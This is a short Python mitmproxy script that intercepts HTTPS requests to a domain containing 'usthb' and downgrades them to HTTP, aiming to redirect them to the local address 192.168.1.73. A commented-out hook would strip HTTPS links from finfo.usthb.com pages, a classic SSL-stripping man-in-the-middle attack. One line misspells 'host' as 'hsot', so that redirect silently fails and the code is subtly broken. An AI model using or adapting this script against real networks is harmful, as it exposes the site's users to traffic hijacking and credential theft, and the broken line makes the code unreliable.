from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Check if the request is HTTPS and directed at the target domain
    if flow.request.scheme == "https" and "usthb" in flow.request.pretty_host:
        print("\n\n",flow.request,"\n\n")
        print("Intercepting request to:", flow.request.pretty_url)
        
        # Change scheme and port to HTTP to redirect traffic to port 80
        flow.request.scheme = "http"
        flow.request.hsot = "192.168.1.73"
        flow.request.port = 80
        # flow.request.headers.pop("Upgrade-Insecure-Requests", None)  # Remove this header for HTTP requests

# def response(flow: http.HTTPFlow) -> None:
#     # Modify response if the content type is text-based
#     if flow.response.headers.get("Content-Type", "").startswith("text/"):
#         # Optionally replace all HTTPS links to HTTP in response content
#         flow.response.text = flow.response.text.replace("https://finfo.usthb.com", "http://finfo.usthb.com")
#         print("Modified response for:", flow.request.pretty_url)
